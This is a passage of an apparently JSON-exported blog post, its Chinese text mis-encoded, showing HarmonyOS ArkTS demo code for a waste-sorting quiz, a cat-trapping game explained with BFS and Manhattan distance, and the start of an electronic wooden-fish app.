Sorting","slug":"HarmonryOS-Next-waste-sorting","date":"2024-12-15T07:33:54.000Z","updated":"2024-12-15T08:58:35.275Z","comments":true,"path":"2024/12/15/HarmonryOS-Next-waste-sorting/","permalink":"https://banjinmei.github.io/2024/12/15/HarmonryOS-Next-waste-sorting/","excerpt":"","text":"ç¯å¢ƒDevEco Studio NEXT Beta1 Build Version: 5.0API 13 Waste Sortingåƒåœ¾åˆ†ç±» ç®—æ³•123456//springCurveå›å¼¹animateToImmediately(&#123; duration:800, curve: curves.springCurve(0, 20, 90, 20), // å…¶ä»–é…ç½®&#125;); åˆå§‹åç§»é‡ã€æŒ¯å¹…ã€å‘¨æœŸå’Œé˜»å°¼ç³»æ•°ï¼Œé€šè¿‡è¿™äº›å‚æ•°å¯ä»¥æ§åˆ¶åŠ¨ç”»çš„å¼¹æ€§æ•ˆæœ 123456789//Fisher-Yatesæ´—ç‰ŒshuffleItems() &#123; for (let i = this.garbageItems.length - 1; i &gt; 0; i--) &#123; const j = Math.floor(Math.random() * (i + 1)); let temp = this.garbageItems[i]; this.garbageItems[i] = this.garbageItems[j]; this.garbageItems[j] = temp; &#125;&#125; ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315import &#123; curves &#125; from &#x27;@kit.ArkUI&#x27;; // å¯¼å…¥ArkUIå·¥å…·åŒ…ä¸­çš„æ›²çº¿æ¨¡å—// å®šä¹‰åƒåœ¾é¡¹ç›®ç±»class GarbageItem &#123; name: string; // åƒåœ¾åç§° type: number; // åƒåœ¾ç±»å‹ description?: string; // åƒåœ¾æè¿°ï¼Œå¯é€‰ // æ„é€ å‡½æ•°åˆå§‹åŒ–åƒåœ¾é¡¹ç›® constructor(name: string, type: number, description?: string) &#123; this.name = name; // è®¾ç½®åƒåœ¾åç§° this.type = type; // è®¾ç½®åƒåœ¾ç±»å‹ this.description = description || &quot;&quot;; // è®¾ç½®åƒåœ¾æè¿°ï¼Œé»˜è®¤ä¸ºç©ºå­—ç¬¦ä¸² &#125;&#125;// å®šä¹‰åƒåœ¾ç±»åˆ«ç±»class GarbageCategory &#123; name: string; // ç±»åˆ«åç§° type: number; // ç±»åˆ«ç±»å‹ color: string; // ç±»åˆ«é¢œè‰² description: string; // ç±»åˆ«æè¿° // æ„é€ å‡½æ•°åˆå§‹åŒ–åƒåœ¾ç±»åˆ« constructor(name: string, type: number, color: string, description: string) &#123; this.name = name; // è®¾ç½®ç±»åˆ«åç§° this.type = type; // è®¾ç½®ç±»åˆ«ç±»å‹ this.color = color; // è®¾ç½®ç±»åˆ«é¢œè‰² this.description = description; // è®¾ç½®ç±»åˆ«æè¿° &#125;&#125;// ä½¿ç”¨ç»„ä»¶è£…é¥°å™¨å®šä¹‰ä¸€ä¸ªåä¸ºIndexçš„åº”ç”¨å…¥å£@Entry@Componentstruct Index &#123; // å®šä¹‰çŠ¶æ€å˜é‡ @State currentQuestionIndex: number = 0; // å½“å‰é¢˜ç›®ç´¢å¼• @State quizResults: string[] = []; // æµ‹éªŒç»“æœæ•°ç»„ @State totalScore: number = 0; // æ€»å¾—åˆ† @State showAnimation: boolean = false; // æ˜¯å¦æ˜¾ç¤ºåŠ¨ç”» @State scaleOptions: ScaleOptions = &#123; x: 1, y: 1 &#125;; // ç¼©æ”¾é€‰é¡¹ @State itemXPosition: number = 0; // ç‰©å“Xè½´ä½ç½® @State itemOpacity: number = 1.0; // ç‰©å“é€æ˜åº¦ // åˆå§‹åŒ–åƒåœ¾ç±»åˆ«æ•°ç»„ @State garbageCategories: GarbageCategory[] = [ new GarbageCategory(&quot;æœ‰å®³åƒåœ¾&quot;, 0, &quot;#e2413f&quot;, &quot;å¯¹äººä½“å¥åº·æˆ–è‡ªç„¶ç¯å¢ƒå¯èƒ½é€ æˆç›´æ¥æˆ–æ½œåœ¨å±å®³çš„ç”Ÿæ´»åƒåœ¾&quot;), // åˆ›å»ºæœ‰å®³åƒåœ¾ç±»åˆ« new GarbageCategory(&quot;å¯å›æ”¶ç‰©&quot;, 1, &quot;#1c6bb5&quot;, &quot;é€‚å®œå›æ”¶å’Œèµ„æºåˆ©ç”¨çš„ç‰©å“&quot;), // åˆ›å»ºå¯å›æ”¶ç‰©ç±»åˆ« new GarbageCategory(&quot;å¨ä½™åƒåœ¾&quot;, 2, &quot;#4ca84e&quot;, &quot;ä¸Šæµ·ç§°æ¹¿åƒåœ¾ï¼Œæ˜“è…çƒ‚çš„ã€å«æœ‰æœºè´¨çš„ç”Ÿæ´»åƒåœ¾&quot;), // åˆ›å»ºå¨ä½™åƒåœ¾ç±»åˆ« new GarbageCategory(&quot;å…¶ä»–åƒåœ¾&quot;, 3, &quot;#5f5f5f&quot;, &quot;ä¸Šæµ·ç§°å¹²åƒåœ¾ï¼Œä¸èƒ½å½’ç±»äºä»¥ä¸Šä¸‰ç±»çš„ç”Ÿæ´»åƒåœ¾&quot;), // åˆ›å»ºå…¶ä»–åƒåœ¾ç±»åˆ« ]; @State garbageItems: GarbageItem[] = [ new GarbageItem(&quot;èœå¸®èœå¶&quot;, 2), new GarbageItem(&quot;å‰©èœå‰©é¥­&quot;, 2), new GarbageItem(&quot;è¿‡æœŸé£Ÿå“&quot;, 2), new GarbageItem(&quot;ç“œæœçš®å£³&quot;, 2), new GarbageItem(&quot;é±¼éª¨é±¼åˆº&quot;, 2), new GarbageItem(&quot;é¸¡è›‹åŠè›‹å£³&quot;, 2), new GarbageItem(&quot;æ®‹æè½å¶&quot;, 2), new GarbageItem(&quot;èŒ¶å¶æ¸£&quot;, 2), new GarbageItem(&quot;é…’ç“¶&quot;, 1,), new GarbageItem(&quot;ç»ç’ƒæ¯&quot;, 1), new GarbageItem(&quot;è°ƒå‘³ç“¶&quot;, 1), new GarbageItem(&quot;å›¾ä¹¦&quot;, 1), new GarbageItem(&quot;æ‰“å°çº¸&quot;, 1), new GarbageItem(&quot;ä¿¡å°&quot;, 1), new GarbageItem(&quot;æ˜“æ‹‰ç½&quot;, 1), new GarbageItem(&quot;é‡‘å±åˆ€å…·&quot;, 1), new GarbageItem(&quot;å¥¶ç²‰æ¡¶&quot;, 1), new GarbageItem(&quot;è¡£æœè£¤å­&quot;, 1), new GarbageItem(&quot;æ¯›ç»’ç©å…·&quot;, 1), new GarbageItem(&quot;é‹&quot;, 1), new GarbageItem(&quot;é¥®æ–™ç“¶&quot;, 1), new GarbageItem(&quot;å¡‘æ–™ç›†&quot;, 1), new GarbageItem(&quot;é£Ÿç”¨æ²¹æ¡¶&quot;, 1), new GarbageItem(&quot;æ´—è¡£æœº&quot;, 1), new GarbageItem(&quot;ç”µçƒ¤ç®±&quot;, 1), new GarbageItem(&quot;ç”µè§†æœº&quot;, 1), new GarbageItem(&quot;å……ç”µç”µæ± &quot;, 0), new GarbageItem(&quot;åºŸå«æ±è§å…‰ç¯ç®¡&quot;, 0), new GarbageItem(&quot;è¿‡æœŸè¯å“åŠå…¶åŒ…è£…ç‰©&quot;, 0), new GarbageItem(&quot;æ²¹æ¼†æ¡¶&quot;, 0), new GarbageItem(&quot;è¡€å‹è®¡&quot;, 0), new GarbageItem(&quot;åºŸæ°´é“¶æ¸©åº¦è®¡&quot;, 0), new GarbageItem(&quot;æ€è™«å–·é›¾ç½&quot;, 0), new GarbageItem(&quot;åºŸXå…‰ç‰‡ç­‰æ„Ÿå…‰èƒ¶ç‰‡&quot;, 0), new GarbageItem(&quot;é£Ÿå“è¢‹&quot;, 3), new GarbageItem(&quot;å¤§æ£’éª¨&quot;, 3), new GarbageItem(&quot;åˆ›å¯è´´&quot;, 3), new GarbageItem(&quot;æ±¡æŸå¡‘æ–™è¢‹&quot;, 3), new GarbageItem(&quot;çƒŸå±&quot;, 3), new GarbageItem(&quot;é™¶ç“·ç¢ç‰‡&quot;, 3), new GarbageItem(&quot;é¤å·¾çº¸&quot;, 3, &quot;å•çº¸ã€å«ç”Ÿçº¸é‡æ°´å³æº¶ï¼Œä¸ç®—å¯å›æ”¶çš„â€œçº¸å¼ â€ï¼Œç±»ä¼¼çš„è¿˜æœ‰çƒŸç›’ç­‰ã€‚&quot;), new GarbageItem(&quot;å«ç”Ÿçº¸&quot;, 3, &quot;å•çº¸ã€å«ç”Ÿçº¸é‡æ°´å³æº¶ï¼Œä¸ç®—å¯å›æ”¶çš„â€œçº¸å¼ â€ï¼Œç±»ä¼¼çš„è¿˜æœ‰çƒŸç›’ç­‰ã€‚&quot;), ]; // åœ¨ç»„ä»¶å³å°†å‡ºç°æ—¶é‡ç½®æµ‹éªŒ aboutToAppear(): void &#123; this.resetQuiz(); // è°ƒç”¨é‡ç½®æµ‹éªŒæ–¹æ³• &#125; // é‡ç½®æµ‹éªŒçŠ¶æ€ resetQuiz() &#123; this.quizResults = []; // æ¸…ç©ºæµ‹éªŒç»“æœ this.totalScore = 0; // æ¸…é›¶æ€»å¾—åˆ† this.currentQuestionIndex = 0; // é‡ç½®å½“å‰é¢˜ç›®ç´¢å¼• this.shuffleItems(); // æ‰“ä¹±åƒåœ¾é¡¹ç›®é¡ºåº &#125; // æ‰“ä¹±åƒåœ¾é¡¹ç›®é¡ºåº shuffleItems() &#123; for (let i = this.garbageItems.length - 1; i &gt; 0; i--) &#123; const j = Math.floor(Math.random() * (i + 1)); // éšæœºç´¢å¼• let temp = this.garbageItems[i]; // ä¸´æ—¶å­˜å‚¨ this.garbageItems[i] = this.garbageItems[j]; // äº¤æ¢ä½ç½® this.garbageItems[j] = temp; // äº¤æ¢ä½ç½® &#125; &#125; // æ£€æŸ¥ç”¨æˆ·é€‰æ‹©çš„ç­”æ¡ˆ checkAnswer(categoryType: number) &#123; const currentItem = this.garbageItems[this.currentQuestionIndex]; // è·å–å½“å‰åƒåœ¾é¡¹ç›® this.quizResults.push(`$&#123;currentItem.name&#125;ï¼ˆ$&#123;this.garbageCategories[categoryType].name&#125;ï¼‰ã€$&#123;currentItem.type === categoryType ? &quot;âœ”&quot; : this.garbageCategories[currentItem.type].name&#125;ã€‘`); // æ·»åŠ åˆ°æµ‹éªŒç»“æœä¸­ if (currentItem.type === categoryType) &#123; // å¦‚æœç­”æ¡ˆæ­£ç¡® this.totalScore += 10; // åŠ ååˆ† &#125; this.currentQuestionIndex++; // è¿›å…¥ä¸‹ä¸€ä¸ªé¢˜ç›® if (this.currentQuestionIndex &gt;= 10) &#123; // å¦‚æœå®Œæˆäº†åä¸ªé¢˜ç›® this.displayResults(); // æ˜¾ç¤ºç»“æœ this.resetQuiz(); // é‡ç½®æµ‹éªŒ &#125; &#125; // æ˜¾ç¤ºæµ‹éªŒç»“æœ displayResults() &#123; let sheets: SheetInfo[] = []; // åˆå§‹åŒ–ç»“æœé¡µé¢åˆ—è¡¨ for (let i = 0; i &lt; this.quizResults.length; i++) &#123; // å¾ªç¯æ·»åŠ æ¯ä¸€ä¸ªç»“æœ sheets.push(&#123; title: this.quizResults[i], // è®¾ç½®æ ‡é¢˜ä¸ºæµ‹éªŒç»“æœ action: () =&gt; &#123; // ä¸æ‰§è¡Œä»»ä½•æ“ä½œ &#125; &#125;); &#125; this.getUIContext().showActionSheet(&#123; // æ˜¾ç¤ºç»“æœé¡µ title: &#x27;æˆç»©å•&#x27;, // æ ‡é¢˜ message: `æ€»åˆ†æ•°:$&#123;this.totalScore&#125;`, // åˆ†æ•°ä¿¡æ¯ confirm: &#123; // ç¡®è®¤æŒ‰é’® defaultFocus: true, // é»˜è®¤ç„¦ç‚¹ value: &#x27;æˆ‘çŸ¥é“äº†&#x27;, // æŒ‰é’®æ–‡æœ¬ action: () =&gt; &#123; // ç‚¹å‡»åçš„åŠ¨ä½œ &#125; &#125;, onWillDismiss: () =&gt; &#123; // å…³é—­å‰çš„åŠ¨ä½œ &#125;, alignment: DialogAlignment.Center, // å¯¹é½æ–¹å¼ä¸ºä¸­å¿ƒ sheets: sheets // ç»“æœé¡µé¢åˆ—è¡¨ &#125;); &#125; // æ„å»ºç”¨æˆ·ç•Œé¢ build() &#123; Column() &#123; // åˆ›å»ºåˆ—å¸ƒå±€ Text(`åƒåœ¾åˆ†ç±»æµ‹éªŒ:$&#123;this.currentQuestionIndex + 1&#125;/10`) // æ˜¾ç¤ºå½“å‰é¢˜ç›®åºå· .fontSize(&#x27;30lpx&#x27;) // è®¾ç½®å­—ä½“å¤§å° .margin(20); // è®¾ç½®å¤–è¾¹è· Stack() &#123; // åˆ›å»ºå †æ ˆå¸ƒå±€ Text(`$&#123;this.garbageItems[this.currentQuestionIndex].name&#125;`) // æ˜¾ç¤ºå½“å‰åƒåœ¾é¡¹ç›®åç§° .textAlign(TextAlign.Center) // å±…ä¸­å¯¹é½ .width(&#x27;130lpx&#x27;) // è®¾ç½®å®½åº¦ .height(&#x27;130lpx&#x27;) // è®¾ç½®é«˜åº¦ .border(&#123; width: 1 &#125;) // è®¾ç½®è¾¹æ¡†å®½åº¦ .borderRadius(5) // è®¾ç½®åœ†è§’åŠå¾„ .fontColor(Color.White) // è®¾ç½®å­—ä½“é¢œè‰² .backgroundColor(Color.Orange) // è®¾ç½®èƒŒæ™¯é¢œè‰² .fontSize(&#x27;20lpx&#x27;) // è®¾ç½®å­—ä½“å¤§å° .padding(2) // è®¾ç½®å†…è¾¹è· .scale(this.scaleOptions); // è®¾ç½®ç¼©æ”¾æ¯”ä¾‹ if (this.showAnimation) &#123; // å¦‚æœæ˜¾ç¤ºåŠ¨ç”» Particle(&#123; // åˆ›å»ºç²’å­æ•ˆæœ particles: [ // åˆå§‹åŒ–ç²’å­æ•°ç»„ &#123; emitter: &#123; // ç²’å­å‘å°„å™¨é…ç½® particle: &#123; // ç²’å­ç±»å‹é…ç½® type: ParticleType.POINT, // ç²’å­ç±»å‹ä¸ºç‚¹ config: &#123; // é…ç½® radius: 5 // ç‚¹çš„åŠå¾„ &#125;, count: 50, // ç²’å­æ•°é‡ lifetime: -1, // ç”Ÿå‘½å‘¨æœŸ lifetimeRange: -1 // ç”Ÿå‘½å‘¨æœŸèŒƒå›´ &#125;, emitRate: 100, // å‘å°„é€Ÿç‡ position: [&#x27;25%&#x27;, 0], // å‘å°„ä½ç½® size: [&#x27;100lpx&#x27;, &#x27;100lpx&#x27;], // å‘å°„å™¨å¤§å° shape: ParticleEmitterShape.RECTANGLE // å‘å°„å™¨å½¢çŠ¶ä¸ºçŸ©å½¢ &#125;, color: &#123; // ç²’å­é¢œè‰²é…ç½® range: [Color.Orange, Color.Orange], // é¢œè‰²èŒƒå›´ updater: &#123; // æ›´æ–°å™¨é…ç½® type: ParticleUpdater.CURVE, // å˜åŒ–æ–¹å¼ä¸ºæ›²çº¿å˜åŒ– config: [ // é…ç½®é¡¹ &#123; from: Color.Orange, // èµ·å§‹é¢œè‰² to: Color.Orange, // ç»ˆæ­¢é¢œè‰² startMillis: 0, // å¼€å§‹æ—¶é—´ endMillis: -1, // ç»“æŸæ—¶é—´ curve: Curve.FastOutLinearIn // æ›²çº¿ç±»å‹ &#125; ] &#125; &#125;, scale: &#123; // ç²’å­å¤§å°é…ç½® range: [0.8, 1.2], // å¤§å°èŒƒå›´ updater: &#123; // æ›´æ–°å™¨é…ç½® type: ParticleUpdater.CURVE, // å˜åŒ–æ–¹å¼ä¸ºæ›²çº¿å˜åŒ– config: [ // é…ç½®é¡¹ &#123; from: 1.0, // èµ·å§‹å¤§å° to: 1.0, // ç»ˆæ­¢å¤§å° startMillis: 0, // å¼€å§‹æ—¶é—´ endMillis: -1, // ç»“æŸæ—¶é—´ curve: Curve.EaseIn &#125; ] &#125; &#125;, // ç²’å­åŠ é€Ÿåº¦é…ç½® acceleration: &#123; speed: &#123; range: [8000, 10000], // å‘ä¸‹å‡é€Ÿï¼Œæ¨¡æ‹Ÿé‡åŠ› updater: &#123; type: ParticleUpdater.RANDOM, // åŠ é€Ÿåº¦çº¿æ€§å˜åŒ– config: [400, 500] &#125; &#125;, angle: &#123; range: [90, 90] // æ–¹å‘å›ºå®šå‘ä¸‹ &#125; &#125;, &#125; ] &#125;).width(&quot;100%&quot;).height(&quot;100%&quot;); &#125; &#125; .width(&#x27;150lpx&#x27;) .height(&#x27;300lpx&#x27;) .align(Alignment.Top) .translate(&#123;x:`$&#123;this.itemXPosition&#125;lpx`,y:0&#125;); Row() &#123; ForEach(this.garbageCategories, (category: GarbageCategory) =&gt; &#123; Column() &#123; Text(category.name) .fontColor(Color.White) .fontSize(&#x27;30lpx&#x27;) .padding(5); Divider(); Text(category.description) .fontColor(Color.White) .fontSize(&#x27;28lpx&#x27;) .padding(5); &#125; .backgroundColor(category.color) .height(&#x27;280lpx&#x27;) .width(&quot;24%&quot;) .border(&#123; width: 1 &#125;) .borderRadius(5) .margin(&#123; left: 1, right: 1 &#125;) .clickEffect(&#123; scale: 0.8, level: ClickEffectLevel.MIDDLE &#125;) .onClick(() =&gt; &#123; if(this.showAnimation)&#123; return &#125; this.showAnimation = true let itemX:number = 0 if(category.type==0)&#123; itemX = -270 &#125;else if(category.type==1)&#123; itemX = -90 &#125;else if(category.type==2)&#123; itemX = 90 &#125;else if(category.type==3)&#123; itemX = 270 &#125; animateToImmediately(&#123; duration:200, onFinish:()=&gt;&#123; animateToImmediately(&#123; duration:800, curve: curves.springCurve(0, 20, 90, 20), onFinish:()=&gt;&#123; animateToImmediately(&#123; duration:200, onFinish:()=&gt;&#123; this.itemXPosition = 0 this.checkAnswer(category.type); this.showAnimation = false &#125; &#125;,()=&gt;&#123; this.itemXPosition = 0 this.scaleOptions = &#123; x: 1.0, y: 1.0 &#125;; &#125;) &#125; &#125;,()=&gt;&#123; this.scaleOptions = &#123; x: 1.3, y: 1.3 &#125;; &#125;) &#125; &#125;,()=&gt;&#123; this.itemXPosition = itemX &#125;) &#125;); &#125;); &#125; Button(&#x27;é‡æ–°å¼€å§‹&#x27;).clickEffect(&#123; level: ClickEffectLevel.LIGHT &#125;).margin(&#123; top: 50 &#125;).onClick(() =&gt; &#123; this.resetQuiz() &#125;); &#125;.width(&#x27;100%&#x27;); &#125;&#125; catch catå›´ä½ç¥ç»çŒ« ç®—æ³•1. å¹¿åº¦ä¼˜å…ˆæœç´¢ï¼ˆBFSï¼‰ï¼šå¹¿åº¦ä¼˜å…ˆæœç´¢ï¼ˆBreadth-First Searchï¼Œç®€ç§° BFSï¼‰æ˜¯ä¸€ç§ç”¨äºå›¾å’Œæ ‘ç»“æ„çš„éå†æˆ–æœç´¢ç®—æ³•ã€‚å®ƒä»ä¸€ä¸ªèµ·å§‹èŠ‚ç‚¹å¼€å§‹ï¼Œé¦–å…ˆè®¿é—®è¯¥èŠ‚ç‚¹çš„æ‰€æœ‰é‚»æ¥èŠ‚ç‚¹ï¼Œç„¶åå†ä»¥åŒæ ·çš„æ–¹å¼é€å±‚è®¿é—®è¿™äº›é‚»æ¥èŠ‚ç‚¹çš„é‚»æ¥èŠ‚ç‚¹ï¼Œç›´åˆ°è®¿é—®å®Œæ•´ä¸ªå›¾æˆ–è€…æ‰¾åˆ°ç›®æ ‡èŠ‚ç‚¹ä¸ºæ­¢ã€‚BFSçš„ç‰¹ç‚¹æ˜¯æŒ‰ç…§ä»è¿‘åˆ°è¿œçš„é¡ºåºè®¿é—®èŠ‚ç‚¹ï¼Œå› æ­¤å®ƒéå¸¸é€‚åˆç”¨æ¥å¯»æ‰¾æœ€çŸ­è·¯å¾„é—®é¢˜ï¼Œå°¤å…¶æ˜¯åœ¨æ‰€æœ‰è¾¹çš„æƒé‡ç›¸ç­‰çš„æƒ…å†µä¸‹ã€‚ BFSçš„åŸºæœ¬æ­¥éª¤å¦‚ä¸‹ï¼šåˆå§‹åŒ–ï¼šé€‰æ‹©ä¸€ä¸ªèµ·å§‹èŠ‚ç‚¹ï¼Œå°†å…¶æ”¾å…¥é˜Ÿåˆ—ï¼Œå¹¶æ ‡è®°ä¸ºå·²è®¿é—®ã€‚å¾ªç¯å¤„ç†ï¼šä»é˜Ÿåˆ—ä¸­å–å‡ºç¬¬ä¸€ä¸ªèŠ‚ç‚¹ã€‚æ£€æŸ¥è¯¥èŠ‚ç‚¹æ˜¯å¦ä¸ºç›®æ ‡èŠ‚ç‚¹ï¼›å¦‚æœæ˜¯ï¼Œåˆ™ç»“æŸæœç´¢ã€‚å¦åˆ™ï¼Œå°†è¯¥èŠ‚ç‚¹çš„æ‰€æœ‰æœªè®¿é—®è¿‡çš„é‚»æ¥èŠ‚ç‚¹åŠ å…¥é˜Ÿåˆ—ï¼Œå¹¶æ ‡è®°ä¸ºå·²è®¿é—®ã€‚ç»ˆæ­¢æ¡ä»¶ï¼šå½“é˜Ÿåˆ—ä¸ºç©ºæ—¶ï¼Œè¡¨ç¤ºæ‰€æœ‰å¯åˆ°è¾¾çš„èŠ‚ç‚¹éƒ½å·²ç»è¢«è®¿é—®è¿‡ï¼Œå¦‚æœæ­¤æ—¶è¿˜æ²¡æœ‰æ‰¾åˆ°ç›®æ ‡èŠ‚ç‚¹ï¼Œåˆ™è¯´æ˜ç›®æ ‡èŠ‚ç‚¹ä¸å¯è¾¾ã€‚ åœ¨ findNeighbors æ–¹æ³•ä¸­ï¼Œé€šè¿‡éå†å½“å‰å•å…ƒæ ¼çš„é‚»å±…æ¥è·å–å‘¨å›´éå¢™å£ä¸”å¯ä»¥ç§»åŠ¨çš„å•å…ƒæ ¼é›†åˆã€‚è¿™ç±»ä¼¼äºå¹¿åº¦ä¼˜å…ˆæœç´¢çš„æ€æƒ³ï¼Œé€å±‚éå†é‚»å±…å•å…ƒæ ¼ã€‚ 123456findNeighbors(cell: Cell): Cell[] &#123; let neighbors: Cell[] = []; // æ£€æŸ¥å½“å‰å•å…ƒæ ¼çš„å…­ä¸ªæ–¹å‘é‚»å±…ï¼Œå°†éå¢™å£ä¸”å¯ä»¥ç§»åŠ¨çš„å•å…ƒæ ¼åŠ å…¥é›†åˆ // ... return neighbors;&#125; 2. å¯å‘å¼æœç´¢ï¼šåœ¨ selectNextMove æ–¹æ³•ä¸­ï¼Œæ ¹æ®ä¸€å®šçš„å¯å‘å¼å‡½æ•°é€‰æ‹©ä¸‹ä¸€ä¸ªç§»åŠ¨ä½ç½®ï¼Œä»¥ç¡®ä¿å°çŒ«æœç€ç¦»è¾¹ç•Œæœ€è¿‘çš„æ–¹å‘ç§»åŠ¨ã€‚è¿™ç§å¯å‘å¼æœç´¢å¯ä»¥å¸®åŠ©å°çŒ«æ›´æ™ºèƒ½åœ°é€‰æ‹©ä¸‹ä¸€æ­¥çš„ç§»åŠ¨ä½ç½®ã€‚ 12345selectNextMove(emptyNeighbors: Cell[]): Cell &#123; // æ ¹æ®å¯å‘å¼å‡½æ•°é€‰æ‹©æœ€ä¼˜çš„ç§»åŠ¨ä½ç½® // ... return closestToEdge || emptyNeighbors[0];&#125; 3. æ›¼å“ˆé¡¿è·ç¦»è®¡ç®—ï¼šæ›¼å“ˆé¡¿è·ç¦»ï¼ˆManhattan Distanceï¼‰ï¼Œä¹Ÿç§°ä¸ºåŸå¸‚è¡—åŒºè·ç¦»ï¼ˆCity Block distanceï¼‰æˆ–å‡ºç§Ÿè½¦å‡ ä½•ï¼Œæ˜¯è¡¡é‡åœ¨æ ‡å‡†åæ ‡ç³»ä¸­ä¸¤ä¸ªç‚¹ä¹‹é—´æ²¿è½´å‘è·ç¦»çš„æ€»å’Œã€‚ç®€å•æ¥è¯´ï¼Œå®ƒæ˜¯ä»ä¸€ä¸ªç‚¹åˆ°å¦ä¸€ä¸ªç‚¹ï¼Œåœ¨åªå…è®¸æ°´å¹³æˆ–å‚ç›´ç§»åŠ¨çš„æƒ…å†µä¸‹ï¼Œå¿…é¡»ç»è¿‡çš„æœ€å°è·ç¦»ã€‚è¿™ä¸ªæ¦‚å¿µå¾—åäºç¾å›½çº½çº¦å¸‚æ›¼å“ˆé¡¿åŒºçš„è¡—é“å¸ƒå±€ï¼Œå› ä¸ºé‚£é‡Œçš„è¡—é“å¤§å¤šå‘ˆç½‘æ ¼çŠ¶åˆ†å¸ƒï¼Œè½¦è¾†åªèƒ½æ²¿ç€è¿™äº›è¡—é“è¡Œé©¶ï¼Œè€Œä¸èƒ½æ–œç©¿ã€‚ åœ¨ computeHeuristic æ–¹æ³•ä¸­ï¼Œä½¿ç”¨æ›¼å“ˆé¡¿è·ç¦»è®¡ç®—å¯å‘å¼å‡½æ•°çš„å€¼ï¼Œä»¥è¯„ä¼°å½“å‰å•å…ƒæ ¼åˆ°è¾¹ç•Œçš„è·ç¦»ã€‚æ›¼å“ˆé¡¿è·ç¦»æ˜¯åœ¨ç½‘æ ¼ä¸Šä¸¤ç‚¹ä¹‹é—´çš„è·ç¦»ï¼Œæ²¿ç€ç½‘æ ¼çš„è¾¹ç¼˜ç§»åŠ¨ã€‚ 12345computeHeuristic(cell: Cell): number &#123; // è®¡ç®—æ›¼å“ˆé¡¿è·ç¦»ä½œä¸ºå¯å‘å¼å‡½æ•°çš„å€¼ // ... return minDistanceX + minDistanceY;&#125; wood fishç”µå­æœ¨é±¼ animateToImmediately 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778// è§‚å¯Ÿè€…æ¨¡å¼è£…é¥°å™¨@ObservedV2class Cell &#123; value: string = &#x27;åŠŸå¾·+1&#x27;; // é»˜è®¤æ˜¾ç¤ºçš„æ–‡å­— @Trace // è·Ÿè¸ªå±æ€§å˜åŒ– opacity: number = 0; // æ–‡å­—é€æ˜åº¦ @Trace // è·Ÿè¸ªå±æ€§å˜åŒ– y: number = 0; // æ–‡å­—çš„å‚ç›´åç§»é‡&#125; // ä¸»å…¥å£ç»„ä»¶@Entry@Componentstruct Index &#123; @State list: Cell[] = []; // å­˜å‚¨æ‰€æœ‰ Cell å¯¹è±¡çš„æ•°ç»„ indexCount: number = 0; // è®°å½•å½“å‰æ»šåŠ¨çš„ç´¢å¼• count: number = 10; // åˆ—è¡¨ä¸­ Cell å¯¹è±¡çš„æ•°é‡ image: string = &#x27;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAQsAAADICAYAAAD/XsT8AAAAAXNSR0IArs4c6QAAEApJREFUeF7tnV921LgSh+093Hfg6S7iPgALmDUAKyFZyQwrubASYCWelMfqcXfabVkuSVXS1+eEhESWpV+Vv1Mq/fE48EGBgwpM0/R2GIYPy2Vvlu/yO/msv8vPvyKrl3KhrHz/vVx3+d04jrF1Rd6SYkcUGI8UpmxfCixQkAf+/QKBNSRqiLGGifz8YwHML0CS3xzAIr/GLu6wgOHT0liJGkLk4KL9q6jke4DIOI7yMx8lBYCFkpAeq1kBwiMcYiWXCASAxKr1oBywUBDRUxUrQHxe5Rc8deFsW8NQ5i+JQIg+4uUEFvFauS25AsST207kaziRR6S2wCJSKI/Fpmn6+jKW7zWCSDVZgMc3oo5rCYFFqksZvY4oQtUwAg6GK4ukwELVt+pVtkAiRBL1GtLunQM4JOLocr0HsHDu3NM0yUzGn50mK2tYr9thCrCo4W4K91wiCYGEt/UQCr03U4WA43kcRxmqNP8BFs5MzHDDpMHmIco4js8mW6fUKGChJGTuakhc5lZYpf6m8xrAQsVH8layTIGyRiKvzJq1NxlpAAtNF1Gui+SlsqDlqxNofGllvQawKO9Au3dkyLErkacCzUQZwMKY2y3RxP+NNYvmnFdANrNJlOF2jQawOO8EKjUwy6Eio/VKBBQfvQIDWBhwL6IJA0Yo1wS3wxJgUc5J7t5pmiZZWCWbvfj0o4BLYACLSg7KCsxKwtu67ZOnhVzAooLzMOyoILrdW8rKzy92m/dvy4BFYSuxwKqw4D5u5wIYwKKQMzHsKCS039t8H8fxo+XmA4sC1mHYUUDkNm4hrzR4Z7UrwCKzZQBFZoHbq94sMIBFRmcjP5FR3LarNgkMYJHJ6Vg/kUnYfqo1BwxgkcH5pmmSvR2cYJVB286qNDVLAiwUvY8ZD0UxqSooYAYYwELJKRdQ/FSqjmpQYK2ACWAACwWnBBQKIlLFngLVl4YDiz0T7fwdUJwUkMuPKFAVGMDiiKluygKKE+JxaaoC1YABLBJNxmKrROG4TEOBKsAAFgmmAxQJonGJpgJVXm4ELA6aEFAcFIziuRQofnI4sDhgSnIUB8SiaAkFigIDWESaFFBECkWx0goUOwQYWESYlpWZESJRpKYCRYABLCJMzF6PCJEoUluB7BvPgMWOiQFF7WeA+x9QICswgMUDSwCKA25KUSsKZNtHAiw2TAworPg+7UhQIAswgMUdS3DCVYJ7cok1BdRXeQKLGxOz6Mqaz9OeEwqoAgNYrCwBKE64JZdaVEB10RawWEzMoiuLvk6bFBRQW4MBLP6FBedmKngmVZhUQGVKFVgMw8DMh0kHp1G6CpzOX3QPC2Y+dD2S2swqcDp/0TUsSGiadWwalkeBU+9T7RYWS0JT8hRv89iFWlHAnAKnchc9w4KEpjlfpkEFFHg3jqMMSQ5/uoQFeYrDfsIFjSgwjmPyM598oVftyFN4tRzt1lAAWESqyMKrSKEo1qoCpzaYdRVZsJ6i1WeAfkUqACxihCJPEaMSZRpXIDm5Kbp0EVmQp2j8EaB7MQqciip6ggXTpDHuRJmWFTgVVXQBi2ma/hyG4XPLXkDfUOCBAqeXeYe6mx6GMPzgIepcAbXt6c1HFtM0/WQ5d+ePS5/dF0hIjuJZs/vNRhZMk2q6CXU5UGAGxDAM31KXc+/1sUlYMPzYMzt/b0CBAIdBO4LY0qZVWDD8aOB